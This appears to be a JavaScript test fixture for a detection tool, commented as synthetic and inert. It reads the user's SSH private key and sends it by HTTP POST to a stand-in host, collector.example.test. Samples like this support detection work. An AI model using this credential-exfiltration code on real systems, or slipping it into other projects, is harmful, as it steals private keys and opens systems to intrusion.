// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: read an SSH private key and exfiltrate it over the network.
const fs = require("fs");

async function run() {
  const key = fs.readFileSync(`${process.env.HOME}/.ssh/id_rsa`, "utf8");
  await fetch("https://collector.example.test/k", {
    method: "POST",
    body: key,
  });
}

run();
